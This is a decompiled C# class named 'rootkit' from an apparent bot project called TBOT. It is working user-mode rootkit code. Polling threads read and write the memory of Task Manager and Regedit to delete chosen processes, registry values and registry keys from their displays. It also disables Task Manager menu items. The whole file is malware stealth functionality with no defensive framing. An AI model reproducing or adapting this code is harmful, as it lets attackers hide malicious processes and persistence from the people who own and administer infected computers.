using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace TBOT;

internal class rootkit
{
	public class Proc
	{
		public static List<Proc> List = new List<Proc>();

		public string Name;

		public string User;

		public Proc(Process proc)
		{
			Name = proc.ProcessName.ToLower();
			User = GetProcessUser(proc).ToLower();
			lock (List)
			{
				List.Add(this);
			}
		}
	}

	public class RegVal
	{
		public static List<RegVal> List = new List<RegVal>();

		public RegistryKey RegKey;

		public string Key;

		public string Value;

		public RegVal(RegistryKey key, string value)
		{
			RegKey = key;
			Key = key.Name.ToLower();
			Value = value.ToLower();
			lock (List)
			{
				List.Add(this);
			}
		}
	}

	internal static class Api
	{
		public struct LvItem
		{
			public uint mask;

			public int iItem;

			public int iSubItem;

			public uint state;

			public uint stateMask;

			public IntPtr pszText;

			public int cchTextMax;

			public int iImage;
		}

		public struct TvItem
		{
			public int mask;

			public IntPtr hItem;

			public int state;

			public int stateMask;

			public IntPtr pszText;

			public int cchTextMax;

			public int iImage;

			public int iSelectedImage;

			public int cChildren;

			public IntPtr lParam;

			public int iIntegral;
		}

		public struct Rect
		{
			private int left;

			private int top;

			private int right;

			private int bottom;
		}

		public struct Point
		{
			private int x;

			private int y;
		}

		public struct WindowPlacement
		{
			public int length;

			public int flags;

			public int showCmd;

			public Point ptMinPosition;

			public Point ptMaxPosition;

			public Rect rcNormalPosition;
		}

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

		[DllImport("user32.dll")]
		public static extern IntPtr GetDlgItem(IntPtr hDlg, int nIDDlgItem);

		[DllImport("user32.dll")]
		public static extern bool EnableWindow(IntPtr hWnd, bool bEnable);

		[DllImport("user32.dll")]
		public static extern IntPtr GetMenu(IntPtr hWnd);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

		[DllImport("user32.dll")]
		public static extern uint GetMenuItemID(IntPtr hMenu, int nPos);

		[DllImport("user32.dll")]
		public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);

		[DllImport("user32.dll")]
		public static extern bool RemoveMenu(IntPtr hMenu, uint uPosition, uint uFlags);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr SendMessage(IntPtr hWnd, [MarshalAs(UnmanagedType.U4)] int msg, IntPtr wParam, ref TvItem item);

		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, uint wParam, IntPtr lParam);

		[DllImport("user32.dll")]
		public static extern bool LockWindowUpdate(IntPtr hWndLock);

		[DllImport("user32.dll")]
		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool GetWindowPlacement(IntPtr hWnd, ref WindowPlacement lpwndpl);

		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId);

		[DllImport("kernel32.dll")]
		public static extern bool CloseHandle(IntPtr hObject);

		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);

		[DllImport("kernel32.dll")]
		public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr baseAddress, byte[] buffer, int dwSize, out int numberOfBytesRead);

		[DllImport("kernel32.dll")]
		public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int dwSize, int lpNumberOfBytesRead);

		[DllImport("kernel32.dll")]
		public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref TvItem buffer, int dwSize, IntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref LvItem buffer, int dwSize, int lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int dwSize, IntPtr lpNumberOfBytesRead);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out int lpwdProcessID);
	}

	public static bool Initialized1;

	public static bool Initialized2;

	public static bool Initialized3;

	public static DateTime TaskManagerTime = DateTime.Now;

	public static int TaskManagerCount;

	public static bool TaskManagerReload;

	public static List<string[]> RegistryKeys = new List<string[]>();

	public static void Initialize(int proc)
	{
		switch (proc)
		{
		case 1:
			new Thread((ThreadStart)delegate
			{
				while (true)
				{
					_HideProcess();
					Thread.Sleep(500);
				}
			}).Start();
			Initialized1 = true;
			break;
		case 2:
			new Thread((ThreadStart)delegate
			{
				while (true)
				{
					Thread.Sleep((!_HideRegistryValue()) ? 250 : 10);
				}
			}).Start();
			Initialized2 = true;
			break;
		case 3:
			new Thread((ThreadStart)delegate
			{
				while (true)
				{
					Thread.Sleep((!_HideRegistryKey()) ? 250 : 10);
				}
			}).Start();
			Initialized3 = true;
			break;
		}
	}

	public static void _HideProcess()
	{
		try
		{
			IntPtr mainWindowHandle = Process.GetProcessesByName("taskmgr")[0].MainWindowHandle;
			Api.WindowPlacement lpwndpl = default(Api.WindowPlacement);
			lpwndpl.length = Marshal.SizeOf((object)lpwndpl);
			Api.GetWindowPlacement(mainWindowHandle, ref lpwndpl);
			bool flag = lpwndpl.showCmd == 1 || lpwndpl.showCmd == 3;
			IntPtr hDlg = Api.FindWindowEx(mainWindowHandle, IntPtr.Zero, null, null);
			IntPtr dlgItem = Api.GetDlgItem(hDlg, 1009);
			IntPtr menu = Api.GetMenu(mainWindowHandle);
			IntPtr subMenu = Api.GetSubMenu(menu, 2);
			IntPtr subMenu2 = Api.GetSubMenu(subMenu, 1);
			uint menuItemID = Api.GetMenuItemID(subMenu, 0);
			if (subMenu2 != IntPtr.Zero)
			{
				Api.SendMessage(mainWindowHandle, 273u, (IntPtr)Api.GetMenuItemID(subMenu2, 3), IntPtr.Zero);
				Api.RemoveMenu(subMenu, (uint)(int)subMenu2, 1u);
			}
			Api.EnableMenuItem(menu, menuItemID, 1u);
			if (flag)
			{
				Api.LockWindowUpdate(dlgItem);
			}
			if ((DateTime.Now - TaskManagerTime).TotalMilliseconds > 1000.0)
			{
				Api.SendMessage(mainWindowHandle, 273u, (IntPtr)menuItemID, IntPtr.Zero);
				TaskManagerTime = DateTime.Now;
			}
			GC.Collect();
			int num = (int)Api.SendMessage(dlgItem, 4100u, IntPtr.Zero, "");
			if (num != TaskManagerCount || TaskManagerReload)
			{
				TaskManagerReload = false;
				TaskManagerCount = num;
				for (int i = 0; i < num; i++)
				{
					string[] array = new string[10];
					for (int j = 0; j < 10; j++)
					{
						array[j] = GetListViewItem(dlgItem, i, j).ToLower();
						if (j > 0 && array[j] == array[0])
						{
							break;
						}
					}
					foreach (Proc item in Proc.List)
					{
						bool flag2 = false;
						bool flag3 = false;
						for (int k = 0; k < 10 && array[k] != null; k++)
						{
							if (flag2 && flag3)
							{
								break;
							}
							if (array[k].StartsWith(item.Name))
							{
								flag2 = true;
							}
							else if (array[k] == item.User)
							{
								flag3 = true;
							}
						}
						if (flag2 && flag3)
						{
							Api.SendMessage(dlgItem, 4104u, (IntPtr)(i--), IntPtr.Zero);
							TaskManagerCount--;
							break;
						}
					}
				}
			}
			if (flag)
			{
				Api.LockWindowUpdate(IntPtr.Zero);
			}
		}
		catch
		{
		}
	}

	public static bool _HideRegistryValue()
	{
		bool result = false;
		try
		{
			IntPtr mainWindowHandle = Process.GetProcessesByName("regedit")[0].MainWindowHandle;
			result = true;
			Api.FindWindowEx(mainWindowHandle, IntPtr.Zero, null, null);
			IntPtr dlgItem = Api.GetDlgItem(mainWindowHandle, 2);
			IntPtr dlgItem2 = Api.GetDlgItem(mainWindowHandle, 3);
			string statusBarText = GetStatusBarText(dlgItem2, 0);
			statusBarText = statusBarText.Substring(statusBarText.IndexOf("\\") + 1).ToLower();
			int num = 0;
			RegistryKey registryKey = null;
			foreach (RegVal item in RegVal.List)
			{
				if (item.Key == statusBarText)
				{
					registryKey = item.RegKey;
					num++;
				}
			}
			if (num > 0)
			{
				int num2 = (int)Api.SendMessage(dlgItem, 4100u, IntPtr.Zero, IntPtr.Zero);
				if (num2 != registryKey.ValueCount + 1 - num)
				{
					Api.LockWindowUpdate(dlgItem);
					for (int i = 1; i < num2; i++)
					{
						foreach (RegVal item2 in RegVal.List)
						{
							if (item2.Key == statusBarText && item2.Value == GetListViewItem(dlgItem, i, 0).ToLower())
							{
								Api.SendMessage(dlgItem, 4104u, (IntPtr)(i--), IntPtr.Zero);
							}
						}
					}
					Api.LockWindowUpdate(IntPtr.Zero);
					return result;
				}
				return result;
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static bool _HideRegistryKey()
	{
		bool result = false;
		try
		{
			IntPtr mainWindowHandle = Process.GetProcessesByName("regedit")[0].MainWindowHandle;
			result = true;
			Api.FindWindowEx(mainWindowHandle, IntPtr.Zero, null, null);
			IntPtr dlgItem = Api.GetDlgItem(mainWindowHandle, 1);
			int index = Api.SendMessage(dlgItem, 4362, 4u, (IntPtr)Api.SendMessage(dlgItem, 4362, 0u, IntPtr.Zero));
			IntPtr intPtr = Marshal.AllocHGlobal(1024);
			Api.GetWindowThreadProcessId(dlgItem, out int lpwdProcessID);
			IntPtr intPtr2 = Api.OpenProcess(2035711u, bInheritHandle: false, lpwdProcessID);
			IntPtr intPtr3 = Api.VirtualAllocEx(intPtr2, IntPtr.Zero, 1024u, 4096u, 4u);
			ExtractRegKey(intPtr2, dlgItem, index, intPtr, intPtr3, new List<string>());
			Marshal.FreeHGlobal(intPtr);
			Api.VirtualFreeEx(intPtr2, intPtr3, 0, 32768u);
			Api.CloseHandle(intPtr2);
			GC.Collect();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void HideProcess(Process process)
	{
		if (!Initialized1)
		{
			Initialize(1);
		}
		new Proc(process);
		TaskManagerReload = true;
	}

	public static void HideRegistryValue(RegistryKey key, string value)
	{
		if (!Initialized2)
		{
			Initialize(2);
		}
		new RegVal(key, value);
	}

	public static void HideRegistryKey(RegistryKey key)
	{
		if (!Initialized3)
		{
			Initialize(3);
		}
		RegistryKeys.Add(key.Name.ToLower().Split(new char[1] { '\\' }));
	}

	public static void ExtractRegKey(IntPtr hProcess, IntPtr hTreeview, int index, IntPtr lpLocalBuffer, IntPtr lpRemoteBuffer, List<string> stack)
	{
		while (index > 0)
		{
			Api.TvItem buffer = default(Api.TvItem);
			buffer.mask = 1;
			buffer.hItem = (IntPtr)index;
			buffer.pszText = (IntPtr)((int)lpRemoteBuffer + Marshal.SizeOf(typeof(Api.TvItem)));
			buffer.cchTextMax = 255;
			Api.WriteProcessMemory(hProcess, lpRemoteBuffer, ref buffer, Marshal.SizeOf(typeof(Api.TvItem)), IntPtr.Zero);
			Api.SendMessage(hTreeview, 4364, 0u, lpRemoteBuffer);
			Api.ReadProcessMemory(hProcess, lpRemoteBuffer, lpLocalBuffer, 1024, IntPtr.Zero);
			string item = Marshal.PtrToStringAnsi((IntPtr)((int)lpLocalBuffer + Marshal.SizeOf(typeof(Api.TvItem))))!.ToLower();
			if (index > 0)
			{
				int num = Api.SendMessage(hTreeview, 4362, 4u, (IntPtr)index);
				stack.Add(item);
				bool flag = false;
				foreach (string[] registryKey in RegistryKeys)
				{
					if (stack.Count != registryKey.Length)
					{
						continue;
					}
					bool flag2 = true;
					for (int i = 0; i < stack.Count; i++)
					{
						if (stack[i] != registryKey[i])
						{
							flag2 = false;
							break;
						}
					}
					if (flag2)
					{
						flag = true;
						break;
					}
				}
				stack.RemoveAt(stack.Count - 1);
				if (flag)
				{
					Api.SendMessage(hTreeview, 4353, 4u, (IntPtr)index);
				}
				else if (num > 0)
				{
					stack.Add(item);
					ExtractRegKey(hProcess, hTreeview, num, lpLocalBuffer, lpRemoteBuffer, new List<string>(stack.ToArray()));
					stack.RemoveAt(stack.Count - 1);
				}
			}
			index = Api.SendMessage(hTreeview, 4362, 1u, (IntPtr)index);
		}
	}

	public static string GetStatusBarText(IntPtr handle, int index)
	{
		int num = (int)Api.SendMessage(handle, 1036u, (IntPtr)index, IntPtr.Zero);
		num = (num & 0xFFFF) * 2;
		uint lpdwProcessId = 0u;
		Api.GetWindowThreadProcessId(handle, out lpdwProcessId);
		IntPtr intPtr = Api.OpenProcess(2033663u, bInheritHandle: false, (int)lpdwProcessId);
		IntPtr intPtr2 = Api.VirtualAllocEx(intPtr, IntPtr.Zero, (uint)num, 12288u, 4u);
		int numberOfBytesRead = 0;
		byte[] array = new byte[num];
		Api.SendMessage(handle, 1037u, (IntPtr)index, intPtr2);
		Api.ReadProcessMemory(intPtr, intPtr2, array, num, out numberOfBytesRead);
		string text = "";
		for (int i = 0; i < array.Length; i += 2)
		{
			text += Convert.ToChar(array[i] | (array[i + 1] << 8));
		}
		Api.CloseHandle(intPtr);
		return text;
	}

	public static string GetListViewItem(IntPtr hWnd, int index, int subitem)
	{
		Api.LvItem buffer = default(Api.LvItem);
		IntPtr intPtr = Marshal.AllocHGlobal(1024);
		Api.GetWindowThreadProcessId(hWnd, out uint lpdwProcessId);
		IntPtr intPtr2 = Api.OpenProcess(2035711u, bInheritHandle: false, (int)lpdwProcessId);
		IntPtr intPtr3 = Api.VirtualAllocEx(intPtr2, IntPtr.Zero, 1024u, 4096u, 4u);
		buffer.mask = 1u;
		buffer.iItem = index;
		buffer.iSubItem = subitem;
		buffer.pszText = (IntPtr)((int)intPtr3 + Marshal.SizeOf(typeof(Api.LvItem)));
		buffer.cchTextMax = 50;
		Api.WriteProcessMemory(intPtr2, intPtr3, ref buffer, Marshal.SizeOf(typeof(Api.LvItem)), 0);
		Api.SendMessage(hWnd, 4101u, IntPtr.Zero, intPtr3);
		Api.ReadProcessMemory(intPtr2, intPtr3, intPtr, 1024, 0);
		string result = Marshal.PtrToStringAnsi((IntPtr)((int)intPtr + Marshal.SizeOf(typeof(Api.LvItem))));
		Marshal.FreeHGlobal(intPtr);
		Api.VirtualFreeEx(intPtr2, intPtr3, 0, 32768u);
		Api.CloseHandle(intPtr2);
		return result;
	}

	public static string GetProcessUser(Process process)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		ManagementObjectCollection val = new ManagementObjectSearcher("Select * From Win32_Process Where ProcessID = " + process.Id).Get();
		ManagementObjectEnumerator enumerator = val.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				string[] array = new string[1] { "" };
				if (Convert.ToInt32(val2.InvokeMethod("GetOwner", (object[])array)) == 0)
				{
					return array[0];
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return "";
	}
}
